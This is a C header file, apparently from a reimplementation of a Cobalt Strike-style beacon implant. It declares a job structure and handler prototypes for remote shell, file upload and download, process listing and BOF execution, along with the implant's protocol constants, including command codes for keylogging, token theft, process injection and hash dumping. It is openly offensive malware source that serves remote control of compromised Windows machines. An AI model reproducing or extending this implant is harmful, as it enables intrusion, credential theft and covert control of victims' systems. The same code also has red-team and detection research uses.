#pragma once
#include <corecrt_io.h>
#include <wchar.h>
#include <locale.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <limits.h>
#include <stdint.h>
#include <processthreadsapi.h>
#include "Config.h"
#include "Util.h"
#include "Api.h"

typedef struct {
    int JobNumber;
    HANDLE pHandle;
    HANDLE hThread;
    int dwProcessId;
    int dwThreadId;
    HANDLE hReadPipe;
    HANDLE hWritePipe;
    struct BeaconJob* Linked;
    BOOL state;
    BOOL kill;
    int JobProcessPid;
    int JobType;
    short lasting;
    char JobName[64];
}BeaconJob;

VOID CmdChangSleepTimes(unsigned char* CommandBuf);
VOID CmdPs(unsigned char* commandBuf, size_t* commandBuflen);
VOID CmdBeaconBof(unsigned char* commandBuf, size_t* commandBuflen);
unsigned char* CmdFileBrowse(unsigned char* commandBuf, size_t* msgLen);
unsigned char* CmdUpload(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen, int chunkNumber);
unsigned char* CmdDrives(unsigned char* commandBuf, size_t* msgLen);
unsigned char* CmdMkdir(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen);
unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen);
unsigned char* CmdFileDownload(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen);
VOID CmdShell(unsigned char* commandBuf, size_t* commandBuflen);
unsigned char* CmdPwd(unsigned char* commandBuf, size_t* msgLen);
unsigned char* CmdGetUid(unsigned char* commandBuf, size_t* msgLen);
wchar_t* makeMetaData();
unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, size_t* buflen);
VOID DataProcess(unsigned char* postMsg, size_t msgLen, int callbackType);

void PipeJob(unsigned char* buf, size_t* commandBuflen, size_t* msgLen);
void CheckTimeout(HANDLE hNamedPipe, int timeout);


#define	CALLBACK_OUTPUT             0
#define	CALLBACK_KEYSTROKES         1
#define	CALLBACK_FILE               2
#define	CALLBACK_SCREENSHOT         3
#define	CALLBACK_CLOSE              4
#define	CALLBACK_READ               5
#define	CALLBACK_CONNECT            6
#define	CALLBACK_PING               7
#define	CALLBACK_FILE_WRITE         8
#define	CALLBACK_FILE_CLOSE         9
#define	CALLBACK_PIPE_OPEN          10
#define	CALLBACK_PIPE_CLOSE         11
#define	CALLBACK_PIPE_READ          12
#define	CALLBACK_POST_ERROR         13
#define	CALLBACK_PIPE_PING          14
#define	CALLBACK_TOKEN_STOLEN       15
#define	CALLBACK_TOKEN_GETUID       16
#define	CALLBACK_PROCESS_LIST       17
#define	CALLBACK_POST_REPLAY_ERROR  18
#define	CALLBACK_PWD                19
#define	CALLBACK_JOBS               20
#define	CALLBACK_HASHDUMP           21
#define	CALLBACK_PENDING            22
#define	CALLBACK_ACCEPT             23
#define	CALLBACK_NETVIEW            24
#define	CALLBACK_PORTSCAN           25
#define	CALLBACK_DEAD               26
#define	CALLBACK_SSH_STATUS         27
#define	CALLBACK_CHUNK_ALLOCATE     28
#define	CALLBACK_CHUNK_SEND         29
#define	CALLBACK_OUTPUT_OEM         30
#define	CALLBACK_ERROR              31
#define	CALLBACK_OUTPUT_UTF8        32
#define	CMD_TYPE_SLEEP                       4
#define	CMD_TYPE_PAUSE                       47
#define	CMD_TYPE_SHELL                       78
#define	CMD_TYPE_UPLOAD_START                10
#define	CMD_TYPE_UPLOAD_LOOP                 67
#define	CMD_TYPE_DOWNLOAD                    11
#define	CMD_TYPE_Jobs						 41
#define	CMD_TYPE_Jobskill				     42
#define	CMD_TYPE_EXIT                        3
#define	CMD_TYPE_CD                          5
#define	CMD_TYPE_PWD                         39
#define	CMD_TYPE_FILE_BROWSE                 53
#define	CMD_TYPE_SPAWN_X64                   44
#define	CMD_TYPE_SPAWN_X86                   1
#define	CMD_TYPE_EXECUTE                     12
#define	CMD_TYPE_GETUID                      27
#define	CMD_TYPE_GET_PRIVS                   77
#define	CMD_TYPE_STEAL_TOKEN                 31
#define	CMD_TYPE_PS                          32
#define	CMD_TYPE_KILL                        33
#define	CMD_TYPE_DRIVES                      55
#define	CMD_TYPE_MKDIR                       54
#define	CMD_TYPE_RM                          56
#define	CMD_TYPE_CP                          73
#define	CMD_TYPE_MV                          74
#define	CMD_TYPE_MAKE_TOKEN                  49
#define	CMD_TYPE_PIPE                        40
#define	CMD_TYPE_PORTSCAN_X86                89
#define	CMD_TYPE_PORTSCAN_X64                90
#define	CMD_TYPE_KEYLOGGER                   101
#define	CMD_TYPE_EXECUTE_ASSEMBLY_X64        88
#define	CMD_TYPE_EXECUTE_ASSEMBLY_X86        87
#define	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X64  71
#define	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X86  70
#define	CMD_TYPE_IMPORT_POWERSHELL           37
#define	CMD_TYPE_POWERSHELL_PORT             79
#define	CMD_TYPE_INJECT_X64                  43
#define	CMD_TYPE_INJECT_X86                  9
#define	CMD_TYPE_BOF                         100
#define	CMD_TYPE_RUNU                        76
#define	CMD_TYPE_ARGUE_QUERY                 85
#define	CMD_TYPE_ARGUE_REMOVE                84
#define	CMD_TYPE_ARGUE_ADD                   83
#define	CMD_TYPE_DumpHASH                    103